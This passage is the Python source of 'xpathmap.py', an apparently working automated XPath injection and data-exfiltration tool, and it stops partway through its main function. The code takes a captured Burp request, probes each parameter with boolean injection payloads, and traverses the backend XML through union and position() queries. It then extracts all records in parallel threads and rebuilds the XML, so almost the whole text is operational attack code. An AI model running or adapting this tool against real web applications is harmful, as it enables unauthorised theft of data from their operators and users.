#!/usr/bin/env python3
"""
xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
Reads raw Burp Suite HTTP request files.

Usage:
    python xpathmap.py -r request.txt
    python xpathmap.py -r request.txt -v
    python xpathmap.py -r request.txt --injectable-param q --node-param f --field streetname
    python xpathmap.py -r request.txt --xml output.xml
    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080
"""

import argparse
import difflib
import re
import sys
import time
import xml.dom.minidom
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field as dc_field
from threading import Lock
from typing import Optional
from urllib.parse import urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────────
# Globals
# ──────────────────────────────────────────────────────────────────────────────

VERBOSE = False


# ──────────────────────────────────────────────────────────────────────────────
# Colors & logging
# ──────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    GRAY   = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def success(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def found(msg):   print(f"{C.GREEN}{C.BOLD}[FOUND]{C.RESET} {msg}")
def debug(msg):
    if VERBOSE:
        print(f"{C.GRAY}[DBG]{C.RESET} {msg}")


# ──────────────────────────────────────────────────────────────────────────────
# Burp request parser
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method: str
    url: str
    headers: dict
    params: dict
    body_params: dict
    raw_body: str

    @property
    def all_params(self) -> dict:
        return {**self.params, **self.body_params}


def parse_burp_request(filepath: str) -> ParsedRequest:
    with open(filepath, "r", errors="replace") as fh:
        content = fh.read()

    lines = content.splitlines()
    if not lines:
        error("Request file is empty.")
        sys.exit(1)

    request_line = lines[0].strip()
    match = re.match(
        r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
        request_line, re.IGNORECASE,
    )
    if not match:
        error(f"Cannot parse request line: {request_line!r}")
        sys.exit(1)

    http_method    = match.group(1).upper()
    path_and_query = match.group(2)

    headers: dict[str, str] = {}
    host = ""
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            key, _, val = lines[i].partition(":")
            headers[key.strip()] = val.strip()
            if key.strip().lower() == "host":
                host = val.strip()
        i += 1

    raw_body = "\n".join(lines[i + 1:]).strip() if i < len(lines) else ""

    scheme   = "https" if headers.get("Referer", "").startswith("https") else "http"
    full_url = f"{scheme}://{host}{path_and_query}"

    parsed = urlparse(full_url)
    params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    body_params: dict[str, str] = {}
    if raw_body and "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
        body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

    for h in ("Accept-Encoding", "Content-Length", "If-None-Match", "If-Modified-Since"):
        headers.pop(h, None)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return ParsedRequest(
        method=http_method, url=base_url, headers=headers,
        params=params, body_params=body_params, raw_body=raw_body,
    )


# ──────────────────────────────────────────────────────────────────────────────
# Response value extractor
# ──────────────────────────────────────────────────────────────────────────────

class ResponseExtractor:
    """
    Figures out how to extract the injected data value from an HTML response.

    Strategy (in order):
      1. Diff against a known-empty "null baseline" — lines/words that appear
         only in the data response but not in the baseline are the result.
      2. Regex patterns commonly used in CTF / lab apps.
      3. Strip all HTML tags and return plain text (last resort).

    The extractor is calibrated once by calling .calibrate(null_html, data_html, known_value).
    After calibration it can reliably parse any future response.
    """

    # Patterns to try if diff fails (ordered by specificity)
    RESULT_PATTERNS = [
        # Results block with <br> before value
        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>|</p>)",
        # Generic: value after last <br> before </center> or </div>
        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
        r"<br\s*/?>\s*([^<]{1,200}?)\s*</div>",
        # Value in a <td> or <span> or <p>
        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
    ]

    NO_DATA_MARKERS = [
        "no results", "no result", "not found", "0 results",
        "nothing found", "empty", "keine ergebnisse",
    ]

    def __init__(self):
        self._mode: str = "regex"          # "diff" | "regex" | "strip"
        self._diff_anchor: str = ""        # stable null-baseline for diffing
        self._regex: Optional[str] = None  # chosen regex pattern
        self._null_stripped: str = ""      # stripped text of null response

    def calibrate(self, null_html: str, data_html: str, known_value: str) -> bool:
        """
        Try to find extraction method that recovers `known_value` from `data_html`
        given that `null_html` is the empty/no-data response.
        Returns True on success.
        """
        debug(f"Calibrating extractor (known_value={known_value!r})")
        self._null_stripped = self._strip_html(null_html)

        # --- Strategy 1: diff ---
        diff_result = self._diff_extract(null_html, data_html)
        if diff_result and known_value.strip().lower() in diff_result.strip().lower():
            self._mode = "diff"
            self._diff_anchor = null_html
            success(f"Extractor mode: diff  (found {known_value!r} in diff)")
            return True

        # --- Strategy 2: regex patterns ---
        for pattern in self.RESULT_PATTERNS:
            m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
            if m:
                extracted = m.group(1).strip()
                if known_value.strip().lower() in extracted.lower():
                    self._mode   = "regex"
                    self._regex  = pattern
                    success(f"Extractor mode: regex  pattern={pattern[:60]!r}")
                    return True

        # --- Strategy 3: plain text diff ---
        stripped = self._strip_html(data_html)
        plain_diff = self._text_diff(self._null_stripped, stripped)
        if known_value.strip().lower() in plain_diff.lower():
            self._mode = "strip_diff"
            self._null_stripped = self._strip_html(null_html)
            success("Extractor mode: stripped-text diff")
            return True

        warn(f"Could not calibrate extractor for value {known_value!r} — will use best-effort")
        self._mode = "strip_diff"
        return False

    def extract(self, html: str) -> Optional[str]:
        """Extract the data value from an HTML response. Returns None if no data."""
        if self._is_no_data(html):
            return None

        if self._mode == "diff":
            val = self._diff_extract(self._diff_anchor, html)
        elif self._mode == "regex" and self._regex:
            m = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
            val = m.group(1).strip() if m else None
        else:
            # strip_diff or fallback
            stripped = self._strip_html(html)
            val = self._text_diff(self._null_stripped, stripped) or None

        if val:
            val = val.strip()
            # Sanity: skip if it looks like HTML leaked through
            if "<" in val and ">" in val:
                val = self._strip_html(val).strip()
            return val if val else None
        return None

    # ── Internals ──────────────────────────────────────────────────────────────

    def _is_no_data(self, html: str) -> bool:
        low = html.lower()
        return any(m in low for m in self.NO_DATA_MARKERS)

    @staticmethod
    def _strip_html(html: str) -> str:
        """Remove all HTML tags and collapse whitespace."""
        text = re.sub(r"<[^>]+>", " ", html)
        text = re.sub(r"\s+", " ", text)
        return text.strip()

    @staticmethod
    def _diff_extract(base: str, new: str) -> str:
        """Return lines/words present in `new` but not in `base`."""
        base_lines = base.splitlines()
        new_lines  = new.splitlines()
        added = []
        for line in difflib.ndiff(base_lines, new_lines):
            if line.startswith("+ "):
                content = line[2:].strip()
                # Skip lines that are just HTML structure (tags only, no text)
                text_only = re.sub(r"<[^>]+>", "", content).strip()
                if text_only:
                    added.append(text_only)
        return " ".join(added).strip()

    @staticmethod
    def _text_diff(base: str, new: str) -> str:
        """Diff on plain-text level."""
        base_words = set(base.split())
        new_words  = new.split()
        unique = [w for w in new_words if w not in base_words]
        return " ".join(unique).strip()


# ──────────────────────────────────────────────────────────────────────────────
# HTTP engine
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Engine:
    req: ParsedRequest
    delay: float = 0.1
    proxies: Optional[dict] = None
    timeout: int = 15
    session: requests.Session = dc_field(default_factory=requests.Session)

    def __post_init__(self):
        self.session.headers.update(self.req.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)
        self.session.verify = False

    def send(self, override_params: dict) -> str:
        params = {**self.req.params, **override_params}
        body   = dict(self.req.body_params)
        debug(f"→ {params}")
        try:
            if self.req.method == "GET":
                resp = self.session.get(self.req.url, params=params, timeout=self.timeout)
            else:
                for k in override_params:
                    if k in body:
                        body[k] = override_params[k]
                resp = self.session.post(
                    self.req.url, params=params, data=body, timeout=self.timeout
                )
            time.sleep(self.delay)
            text = resp.text.strip()
            debug(f"← {resp.status_code}  len={len(text)}  {text[:100]!r}")
            return text
        except requests.RequestException as e:
            warn(f"Request error: {e}")
            return ""


# ──────────────────────────────────────────────────────────────────────────────
# Injection detection
# ──────────────────────────────────────────────────────────────────────────────

NULL_PAYLOADS = [
    "') and ('1'='2",
    "' and '1'='2",
    "') and ('0'='1",
    '\") and (\"1\"=\"2',
]

TRUE_PAYLOADS = [
    "') or ('1'='1",
    "' or '1'='1",
    '\") or (\"1\"=\"1',
]

NO_DATA_MARKERS = ["no results", "no result", "not found", "nothing found"]


def _seems_empty(html: str) -> bool:
    low = html.lower()
    return any(m in low for m in NO_DATA_MARKERS) or not html.strip()


def _seems_has_data(html: str) -> bool:
    return bool(html.strip()) and not _seems_empty(html)


def detect_injectable_param(
    engine: Engine,
    candidates: list[str],
    node_param: Optional[str] = None,
    node_field: Optional[str] = None,
) -> tuple[Optional[str], Optional[str]]:
    info("Auto-detecting injectable parameter...")
    baseline = engine.send({})
    debug(f"Baseline len={len(baseline)}")

    for param in candidates:
        for null_pay in NULL_PAYLOADS:
            null_resp = engine.send({param: null_pay})
            for true_pay in TRUE_PAYLOADS:
                true_resp = engine.send({param: true_pay})
                null_empty = _seems_empty(null_resp)
                true_has   = _seems_has_data(true_resp)
                debug(f"  {param!r}  null_empty={null_empty}  true_has={true_has}")

                if null_empty and true_has:
                    success(f"Injectable param (boolean): '{param}'  payload={null_pay!r}")
                    return param, null_pay

                if null_resp != true_resp and abs(len(null_resp) - len(true_resp)) > 10:
                    if null_empty or len(null_resp) < len(true_resp):
                        success(f"Injectable param (diff): '{param}'  payload={null_pay!r}")
                        return param, null_pay

    # Union probe fallback
    if node_param and node_field:
        info("Trying union probe fallback...")
        for param in candidates:
            for null_pay in NULL_PAYLOADS:
                for depth in range(2, 6):
                    path  = "".join("/*[1]" for _ in range(depth))
                    probe = f"{node_field} | {path}"
                    resp  = engine.send({param: null_pay, node_param: probe})
                    if _seems_has_data(resp):
                        success(f"Injectable param (union probe): '{param}'  payload={null_pay!r}")
                        return param, null_pay

    return None, None


def detect_node_param(
    engine: Engine,
    inj_param: str,
    null_pay: str,
    candidates: list[str],
) -> tuple[Optional[str], Optional[str]]:
    info("Auto-detecting node-selection parameter...")
    null_baseline = engine.send({inj_param: null_pay})

    for param in candidates:
        original = engine.req.params.get(param) or engine.req.body_params.get(param, "")
        if not original:
            continue
        for depth in range(2, 6):
            path  = "".join("/*[1]" for _ in range(depth))
            probe = f"{original} | {path}"
            resp  = engine.send({inj_param: null_pay, param: probe})
            if _seems_has_data(resp) and resp != null_baseline:
                success(f"Node-selection param: '{param}'  field='{original}'")
                return param, original
    return None, None


def get_field_from_param(engine: Engine, node_param: str) -> Optional[str]:
    val = engine.req.params.get(node_param) or engine.req.body_params.get(node_param, "")
    return val.strip() or None


# ──────────────────────────────────────────────────────────────────────────────
# XPath traversal — Node Selection
# ──────────────────────────────────────────────────────────────────────────────

def build_path(indices: list[int]) -> str:
    return "".join(f"/*[{i}]" for i in indices)


def probe_raw(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    indices: list[int],
) -> str:
    """Returns raw HTML for a node probe."""
    path    = build_path(indices)
    f_value = f"{field_name} | {path}"
    return engine.send({inj_param: null_pay, node_param: f_value})


def find_data_path(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    base_indices: list[int],
    extractor: ResponseExtractor,
    max_depth: int = 8,
    max_siblings: int = 20,
) -> Optional[list[int]]:
    """
    BFS search for the first path (from base_indices) that returns data.

    Problem: intermediate nodes may be at any index, not just [1].
    Example: /*[1]/*[2]/*[3]/*[1]/*[3] — the group node is at /*[3], not /*[1].

    We do a level-by-level BFS:
      - At each depth level, try indices 1..max_siblings
      - If a probe returns data → we found a leaf → return full path
      - If a probe returns "array-like" empty (no data but the page loaded) →
        that index exists but has children → add to next BFS frontier
      - Track "alive" paths (responded without error) to explore deeper

    Returns the full indices list to the first data-bearing leaf, or None.
    """
    # Frontier: list of partial paths to explore
    frontier: list[list[int]] = [list(base_indices)]
    visited:  set[tuple] = set()

    for _ in range(max_depth):
        next_frontier: list[list[int]] = []

        for path in frontier:
            if tuple(path) in visited:
                continue
            visited.add(tuple(path))

            # Try each sibling index at this level
            for idx in range(1, max_siblings + 1):
                candidate = path + [idx]
                raw = probe_raw(engine, inj_param, null_pay, node_param,
                                field_name, candidate)
                val = extractor.extract(raw)
                debug(f"  BFS {build_path(candidate)} → {val!r}")

                if val is not None:
                    # Found data — this is a leaf node
                    return candidate

                # Check if this node exists but has children (returns empty/array)
                # Heuristic: page loaded (has HTML) but no data value
                if raw and len(raw) > 100 and tuple(candidate) not in visited:
                    next_frontier.append(candidate)

        if not next_frontier:
            break
        frontier = next_frontier

    return None


def detect_first_data_path(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    dataset_idx: int,
    extractor: ResponseExtractor,
    max_depth: int = 8,
    max_siblings: int = 20,
) -> Optional[list[int]]:
    """
    Find the XPath path to the first data value in this dataset.
    Returns full index list e.g. [1, 2, 3, 1, 1] for /*[1]/*[2]/*[3]/*[1]/*[1]
    """
    base = [1, dataset_idx]
    return find_data_path(
        engine, inj_param, null_pay, node_param, field_name,
        base, extractor, max_depth, max_siblings,
    )


def exfiltrate_record(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    record_path: list[int],       # path to the record node (without field index)
    extractor: ResponseExtractor,
    max_fields: int = 20,
) -> list[str]:
    """Extract all fields of one record by appending field index 1..N."""
    values: list[str] = []
    for field_idx in range(1, max_fields + 1):
        raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
                        record_path + [field_idx])
        val = extractor.extract(raw)
        if val is None:
            break
        values.append(val)
    return values


def collect_all_record_paths(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    first_data_path: list[int],
    extractor: ResponseExtractor,
    max_siblings: int,
    max_records: int,
) -> list[list[int]]:
    """
    Given the path to the FIRST data leaf, reconstruct all record-level paths.

    The structure is:
      first_data_path = [root, dataset, *groups, record_idx, field_idx]
      first_data_path[-1] = first field index (usually 1)
      first_data_path[-2] = first record index within its group
      first_data_path[2:-2] = intermediate group indices (may be any values)

    We need to:
      1. Iterate record_idx within each group (first_data_path[2:-1])
      2. Iterate ALL group combinations (each intermediate level 2..-2)

    Strategy: treat every level between [dataset_idx] and [record_idx] as a
    potential "group level". We enumerate all combinations of group indices
    and within each combination enumerate record indices.
    """
    # Decompose the path
    # path = [1, ds, g1, g2, ..., gN, rec, field]
    # prefix_fixed = [1, ds]   (never changes)
    # group_levels = [g1, g2, ..., gN]  (0 or more intermediate group indices)
    # rec = first_data_path[-2]

    prefix_fixed  = first_data_path[:2]            # [1, dataset_idx]
    group_indices = list(first_data_path[2:-2])    # intermediate group path
    n_group_levels = len(group_indices)

    all_record_paths: list[list[int]] = []

    if n_group_levels == 0:
        # No intermediates: path is [root, ds, rec, field]
        # Just iterate rec_idx
        for rec_idx in range(1, max_records + 1):
            all_record_paths.append(prefix_fixed + [rec_idx])
        return all_record_paths

    # We have group levels. Enumerate all combinations by probing each level.
    # For each group level L, find valid indices by probing with a fixed suffix.
    # We do this recursively / iteratively: build the group prefix level by level.

    def enumerate_group_combos(
        fixed_prefix: list[int],
        remaining_levels: int,
    ) -> list[list[int]]:
        """Return all valid group-prefix paths of `remaining_levels` more levels."""
        if remaining_levels == 0:
            return [fixed_prefix]

        result = []
        for idx in range(1, max_siblings + 1):
            candidate = fixed_prefix + [idx]
            # Quick probe: append [1] for remaining levels + [1] field to check if alive
            probe_path = candidate + [1] * (remaining_levels - 1) + [1, 1]
            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name, probe_path)
            val = extractor.extract(raw)
            if val is not None:
                # This group index has data — explore further
                sub = enumerate_group_combos(candidate, remaining_levels - 1)
                result.extend(sub)
            elif raw and len(raw) > 100:
                # Group exists but need to go deeper
                sub = enumerate_group_combos(candidate, remaining_levels - 1)
                result.extend(sub)
            else:
                # Group index doesn't exist — stop scanning siblings for this level
                # (XPath indices are contiguous from 1)
                break
        return result

    group_combos = enumerate_group_combos(prefix_fixed, n_group_levels)
    info(f"    Found {len(group_combos)} group prefix(es) to iterate")

    for group_prefix in group_combos:
        for rec_idx in range(1, max_records + 1):
            record_path = group_prefix + [rec_idx]
            # Quick probe field 1 to see if record exists
            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
                            record_path + [1])
            val = extractor.extract(raw)
            if val is None:
                break  # No more records in this group
            all_record_paths.append(record_path)

    return all_record_paths


def exfiltrate_dataset(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    dataset_idx: int,
    extractor: ResponseExtractor,
    max_depth: int, max_records: int, max_fields: int,
    max_siblings: int = 20,
    threads: int = 5,
) -> list[list[str]]:
    print()
    info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")

    # Step 1: find path to first data value via BFS
    first_path = detect_first_data_path(
        engine, inj_param, null_pay, node_param, field_name,
        dataset_idx, extractor, max_depth, max_siblings,
    )
    if first_path is None:
        warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
        return []

    info(f"    First data path: {build_path(first_path)}")

    if len(first_path) < 4:
        warn("    Path too short to decompose into record/field structure.")
        return []

    # Step 2: collect ALL record-level paths (handles groups at any index)
    info("    Enumerating all record paths (iterating groups)...")
    record_paths = collect_all_record_paths(
        engine, inj_param, null_pay, node_param, field_name,
        first_path, extractor, max_siblings, max_records,
    )
    info(f"    Total records to fetch: {len(record_paths)}")

    if not record_paths:
        warn("    No record paths found.")
        return []

    # Step 3: fetch all records in parallel
    records_map: dict[int, list[str]] = {}
    lock = Lock()
    counter = [0]

    def fetch_record(idx_path: tuple[int, list[int]]) -> tuple[int, list[str]]:
        order, rpath = idx_path
        rec = exfiltrate_record(
            engine, inj_param, null_pay, node_param, field_name,
            rpath, extractor, max_fields,
        )
        return order, rec

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(fetch_record, (i, p)): i
            for i, p in enumerate(record_paths)
        }
        for future in as_completed(futures):
            order, rec = future.result()
            if rec:
                with lock:
                    records_map[order] = rec
                    counter[0] += 1
                    found(f"Record {counter[0]:>4} {build_path(record_paths[order])}: {' | '.join(rec)}")

    # Return records in original order
    records = [records_map[i] for i in sorted(records_map)]
    return records


def run_node_selection(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    extractor: ResponseExtractor,
    max_datasets: int, max_depth: int,
    max_records: int, max_fields: int,
    max_siblings: int = 20,
    threads: int = 5,
) -> dict[int, list[list[str]]]:
    info(f"Node-selection | inj='{inj_param}' node='{node_param}' field='{field_name}'")

    # ── Calibrate extractor ───────────────────────────────────────────────────
    # Find ANY data response quickly using simple [1,1,...] probe
    info("Calibrating response extractor...")
    null_html = engine.send({inj_param: null_pay})
    calibrated = False

    for ds in range(1, 3):
        for extra in range(1, max_depth + 1):
            indices   = [1, ds] + [1] * extra
            data_html = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
            for pattern in ResponseExtractor.RESULT_PATTERNS:
                m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
                if m:
                    known = m.group(1).strip()
                    if known and "no result" not in known.lower() and len(known) < 200:
                        extractor.calibrate(null_html, data_html, known)
                        calibrated = True
                        break
            if calibrated:
                break
        if calibrated:
            break

    if not calibrated:
        warn("Could not calibrate via simple probe — will use best-effort extraction")
        extractor._mode = "strip_diff"
        extractor._null_stripped = ResponseExtractor._strip_html(null_html)

    # ── Exfiltrate all datasets ───────────────────────────────────────────────
    all_data: dict[int, list[list[str]]] = {}
    consecutive_empty = 0

    for ds_idx in range(1, max_datasets + 1):
        records = exfiltrate_dataset(
            engine, inj_param, null_pay, node_param, field_name,
            ds_idx, extractor, max_depth, max_records, max_fields,
            max_siblings=max_siblings, threads=threads,
        )
        if records:
            all_data[ds_idx] = records
            consecutive_empty = 0
        else:
            consecutive_empty += 1
            if consecutive_empty >= 2:
                info("Two consecutive empty datasets — stopping.")
                break

    return all_data


# ──────────────────────────────────────────────────────────────────────────────
# Predicate method
# ──────────────────────────────────────────────────────────────────────────────

def run_predicate(
    engine: Engine,
    inj_param: str,
    extractor: ResponseExtractor,
    null_pay: str,
    step: int,
    max_records: int,
) -> list[str]:
    info(f"Predicate exfiltration via position() | param='{inj_param}' step={step}")

    null_html = engine.send({inj_param: null_pay})
    extractor._null_stripped = ResponseExtractor._strip_html(null_html)
    extractor._mode = "strip_diff"

    results: list[str] = []
    position = 0

    while position < max_records:
        payload = f"') and (position()>{position}) and ('1'='1"
        raw     = engine.send({inj_param: payload})
        val     = extractor.extract(raw)

        if val is None:
            info(f"    No data at position()>{position}. Done.")
            break

        batch = [v.strip() for v in val.split() if v.strip()]
        results.extend(batch)
        found(f"position()>{position}: {batch}")
        position += step

    return results


# ──────────────────────────────────────────────────────────────────────────────
# XML reconstruction
# ──────────────────────────────────────────────────────────────────────────────

def build_xml(data: dict[int, list[list[str]]], field_name: str) -> str:
    """
    Reconstruct an XML document from the extracted data.
    Node names are inferred where possible; otherwise generic names are used.

    Structure mirrors what we traversed:
      <root>
        <dataset_1>
          <record>
            <field_1>value</field_1>
            ...
          </record>
        </dataset_1>
        <dataset_2>
          ...
        </dataset_2>
      </root>
    """
    root = ET.Element("root")

    for ds_idx, records in data.items():
        # If only one dataset and we know the field name, use it as context
        ds_tag = f"dataset_{ds_idx}"
        ds_el  = ET.SubElement(root, ds_tag)

        # Try to guess field names from the first record + known field_name
        # Field index 1 usually corresponds to the field_name we queried
        n_fields = max((len(r) for r in records), default=0)
        field_names: list[str] = []
        for fi in range(n_fields):
            if fi == 0 and field_name and field_name not in ("text()", ""):
                field_names.append(field_name)
            else:
                field_names.append(f"field_{fi + 1}")

        for rec_idx, record in enumerate(records, 1):
            rec_el = ET.SubElement(ds_el, "record")
            rec_el.set("index", str(rec_idx))
            for fi, value in enumerate(record):
                fname  = field_names[fi] if fi < len(field_names) else f"field_{fi + 1}"
                f_el   = ET.SubElement(rec_el, fname)
                f_el.text = value

    # Pretty-print
    raw_xml = ET.tostring(root, encoding="unicode")
    try:
        pretty = xml.dom.minidom.parseString(raw_xml).toprettyxml(indent="  ")
        # Remove the <?xml ...?> declaration line minidom adds
        lines  = pretty.splitlines()
        pretty = "\n".join(lines[1:])
        return pretty
    except Exception:
        return raw_xml


# ──────────────────────────────────────────────────────────────────────────────
# Output
# ──────────────────────────────────────────────────────────────────────────────

def print_summary(data, xml_str: Optional[str] = None):
    print()
    print(f"{C.BOLD}{'='*60}{C.RESET}")
    print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
    print(f"{C.BOLD}{'='*60}{C.RESET}")

    if isinstance(data, dict):
        total = sum(len(v) for v in data.values())
        print(f"  Datasets: {len(data)}   Total records: {total}")
        for ds_idx, records in data.items():
            print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
            print(f"  {'-'*50}")
            for i, rec in enumerate(records, 1):
                print(f"    [{i:>3}]  {' | '.join(rec)}")
    elif isinstance(data, list):
        print(f"  Total items: {len(data)}")
        print(f"  {'-'*50}")
        for i, item in enumerate(data, 1):
            print(f"    [{i:>3}]  {item}")

    if xml_str:
        print(f"\n{C.CYAN}{'─'*60}{C.RESET}")
        print(f"{C.CYAN}  RECONSTRUCTED XML{C.RESET}")
        print(f"{C.CYAN}{'─'*60}{C.RESET}")
        print(xml_str)

    print(f"{C.BOLD}{'='*60}{C.RESET}")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
   ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
"""


def parse_args():
    p = argparse.ArgumentParser(
        description="xpathmap — XPath injection tool (reads Burp request files)"
    )
    p.add_argument("-r", "--request", required=True,
                   help="Path to raw Burp Suite HTTP request file")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Print every request/response for debugging")
    p.add_argument("--method", choices=["auto", "node_selection", "predicate"],
                   default="auto")
    p.add_argument("--injectable-param", default=None,
                   help="Force injectable parameter (e.g. q)")
    p.add_argument("--node-param", default=None,
                   help="Force node-selection parameter (e.g. f)")
    p.add_argument("--field", default=None,
                   help="XPath field name in node param (e.g. streetname)")
    p.add_argument("--null-payload", default=None,
                   help="Force null payload string")
    p.add_argument("--xml", default=None, metavar="FILE",
                   help="Save reconstructed XML to file")
    p.add_argument("--delay",          type=float, default=0.1)
    p.add_argument("--proxy",          default=None)
    p.add_argument("--timeout",        type=int,   default=15)
    p.add_argument("--max-datasets",   type=int,   default=6)
    p.add_argument("--max-depth",      type=int,   default=8)
    p.add_argument("--max-records",    type=int,   default=500)
    p.add_argument("--max-fields",     type=int,   default=20)
    p.add_argument("--predicate-step", type=int,   default=5)
    p.add_argument("--max-siblings",   type=int,   default=20,
                   help="Max sibling indices to probe per BFS level (default: 20)")
    p.add_argument("--threads",        type=int,   default=5,
                   help="Number of threads for parallel record fetching (default: 5)")
    p.add_argument("--result-start",   default=None,
                   help="Regex pattern marking start of result value (e.g. 'Results:.*?<br><br>')")
    p.add_argument("--result-end",     default=None,
                   help="Regex pattern marking end of result value (e.g. '</center>')")
    return p.parse_args()


def main():
    global VERBOSE

    print(BANNER)
    args    = parse_args()
    VERBOSE = args.verbose

    info(f"Loading request: {args.request}")
    req = parse_burp_request(args.request)
    info(f"Target  : {req.url}")
    info(f"Method  : {req.method}")
    info(f"Params  : {list(req.all_params.keys())}")

    if not req.all_params:
        error("No parameters found.")
        sys.exit(1)

    proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
    all_params = list(req.all_params.keys())

    # ── Resolve injectable param ──────────────────────────────────────────────
    inj_param:  Optional[str] = args.injectable_param
    null_pay:   Optional[str] = args.null_payload
    node_param: Optional[str] = args.node_param
    field_name: Optional[str] = args.field

    if inj_param and null_pay:
        success(f"Using forced: inj='{inj_param}'  payload={null_pay!r}")
    elif inj_param:
        node_hint  = node_param or next((p for p in all_params if p != inj_param), None)
        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
        _, null_pay = detect_injectable_param(
            engine, [inj_param], node_param=node_hint, node_field=field_hint
        )
        if not null_pay:
            warn("Could not detect null payload — using canonical: ') and ('1'='2")
            null_pay = "') and ('1'='2"
    else:
        node_hint  = node_param or next((p for p in all_params if p != all_params[0]), None)
        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
        inj_param, null_pay = detect_injectable_param(
            engine, all_params, node_param=node_hint, node_field=field_hint
        )
        if not inj_param:
            error(
                "Could not auto-detect injectable parameter.\n"
                "  Try: --injectable-param q --node-param f --field streetname\n"
                "  Or add -v for debug output."
            )
            sys.exit(1)

    # ── Resolve method ────────────────────────────────────────────────────────
    method = args.method
    if method == "auto":
        remaining = [p for p in all_params if p != inj_param]
        method    = "node_selection" if remaining else "predicate"
        info(f"Method: {C.BOLD}{method}{C.RESET}")

    # ── Resolve node param ────────────────────────────────────────────────────
    if method == "node_selection":
        if not node_param:
            remaining = [p for p in all_params if p != inj_param]
            if not remaining:
                warn("No second parameter — switching to predicate.")
                method = "predicate"
            else:
                node_param, _ = detect_node_param(engine, inj_param, null_pay, remaining)
                if not node_param:
                    node_param = remaining[0]
                    warn(f"Assuming node param: '{node_param}'")

        if method == "node_selection" and not field_name:
            field_name = get_field_from_param(engine, node_param) if node_param else "text()"
            info(f"Field: '{field_name}'")

    # ── Run ───────────────────────────────────────────────────────────────────
    print()
    extractor = ResponseExtractor()

    # Inject custom regex pattern if user provided start/end markers
    if args.result_start or args.result_end:
        start = args.result_start or ""
        end   = args.result_end   or ""
        custom_pattern = f"{start}(.+?){end}"
        info(f"Using custom result pattern: {custom_pattern!r}")
        # Prepend so it's tried first
        ResponseExtractor.RESULT_PATTERNS.insert(0, custom_pattern)

    if method == "node_selection":
        data = run_node_selection(
            engine, inj_param, null_pay, node_param, field_name, extractor,
            args.max_datasets, args.max_depth, args.max_records, args.max_fields,
            max_siblings=args.max_siblings, threads=args.threads,
